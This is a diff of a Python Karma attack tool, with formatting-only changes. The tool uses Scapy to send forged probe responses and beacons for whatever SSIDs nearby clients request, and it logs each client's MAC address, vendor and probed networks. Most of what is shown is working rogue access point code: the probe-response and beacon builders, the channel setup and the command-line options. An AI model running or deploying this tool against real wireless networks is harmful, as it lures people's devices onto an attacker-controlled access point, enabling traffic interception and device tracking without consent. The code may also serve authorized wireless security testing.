@@ -34,11 +34,15 @@ DEFAULT_BLACKLIST: list[str] = [
 
 
 class KarmaAttack:
-    def __init__(self, interface: str, channel: int = 6,
-                 whitelist: Optional[list[str]] = None,
-                 blacklist: Optional[list[str]] = None,
-                 log_file: str = "captures/karma_probes.log",
-                 bssid: Optional[str] = None) -> None:
+    def __init__(
+        self,
+        interface: str,
+        channel: int = 6,
+        whitelist: Optional[list[str]] = None,
+        blacklist: Optional[list[str]] = None,
+        log_file: str = "captures/karma_probes.log",
+        bssid: Optional[str] = None,
+    ) -> None:
         self.interface: str = interface
         self.channel: int = channel
         self.whitelist: Optional[list[str]] = whitelist
@@ -90,9 +94,7 @@ class KarmaAttack:
             self.seen_probes[client_mac].add(ssid)
 
             vendor = lookup_vendor(client_mac)
-            self.logger.info(
-                "Probe: %s (%s) -> '%s'", client_mac, vendor, ssid
-            )
+            self.logger.info("Probe: %s (%s) -> '%s'", client_mac, vendor, ssid)
 
             response = self._create_probe_response(ssid, client_mac)
             sendp(response, iface=self.interface, verbose=False)
@@ -108,8 +110,11 @@ class KarmaAttack:
 
     def _create_probe_response(self, ssid: str, client_mac: str) -> object:
         dot11 = Dot11(
-            type=0, subtype=5,
-            addr1=client_mac, addr2=self.bssid, addr3=self.bssid,
+            type=0,
+            subtype=5,
+            addr1=client_mac,
+            addr2=self.bssid,
+            addr3=self.bssid,
         )
         probe_resp = Dot11ProbeResp(cap="ESS+privacy")
         essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
@@ -119,8 +124,11 @@ class KarmaAttack:
 
     def _create_beacon(self, ssid: str) -> object:
         dot11 = Dot11(
-            type=0, subtype=8,
-            addr1="ff:ff:ff:ff:ff:ff", addr2=self.bssid, addr3=self.bssid,
+            type=0,
+            subtype=8,
+            addr1="ff:ff:ff:ff:ff:ff",
+            addr2=self.bssid,
+            addr3=self.bssid,
         )
         beacon = Dot11Beacon(cap="ESS+privacy")
         essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
@@ -133,7 +141,9 @@ class KarmaAttack:
             if validate_interface(self.interface):
                 subprocess.run(
                     ["iwconfig", self.interface, "channel", str(self.channel)],
-                    capture_output=True, text=True, timeout=5,
+                    capture_output=True,
+                    text=True,
+                    timeout=5,
                 )
                 self.logger.info("Set channel to %d", self.channel)
         except (subprocess.TimeoutExpired, FileNotFoundError, OSError) as e:
@@ -172,9 +182,9 @@ class KarmaAttack:
         for ssids in self.seen_probes.values():
             unique_ssids.update(ssids)
 
-        print(f"\n{'='*60}")
+        print(f"\n{'=' * 60}")
         print("Karma Attack Summary")
-        print(f"{'='*60}")
+        print(f"{'=' * 60}")
         print(f"Unique clients:    {unique_clients}")
         print(f"Unique SSIDs:      {len(unique_ssids)}")
         print(f"Responses sent:    {self.responded_count}")
@@ -226,20 +236,22 @@ Note: Interface must be in monitor mode.
         """,
     )
 
-    parser.add_argument("-i", "--interface", required=True,
-                        help="Wireless interface in monitor mode")
-    parser.add_argument("-ch", "--channel", type=int, default=6,
-                        help="Channel to operate on (default: 6)")
-    parser.add_argument("--whitelist",
-                        help="File with SSIDs to respond to (one per line)")
-    parser.add_argument("--blacklist",
-                        help="File with SSIDs to ignore (one per line)")
-    parser.add_argument("-o", "--output", default="captures/karma_probes.log",
-                        help="Log file (default: captures/karma_probes.log)")
-    parser.add_argument("--bssid",
-                        help="Custom BSSID to use (default: auto-generated)")
-    parser.add_argument("-v", "--verbose", action="store_true",
-                        help="Verbose output")
+    parser.add_argument(
+        "-i", "--interface", required=True, help="Wireless interface in monitor mode"
+    )
+    parser.add_argument(
+        "-ch", "--channel", type=int, default=6, help="Channel to operate on (default: 6)"
+    )
+    parser.add_argument("--whitelist", help="File with SSIDs to respond to (one per line)")
+    parser.add_argument("--blacklist", help="File with SSIDs to ignore (one per line)")
+    parser.add_argument(
+        "-o",
+        "--output",
+        default="captures/karma_probes.log",
+        help="Log file (default: captures/karma_probes.log)",
+    )
+    parser.add_argument("--bssid", help="Custom BSSID to use (default: auto-generated)")
+    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
 
     args = parser.parse_args()
     require_root()
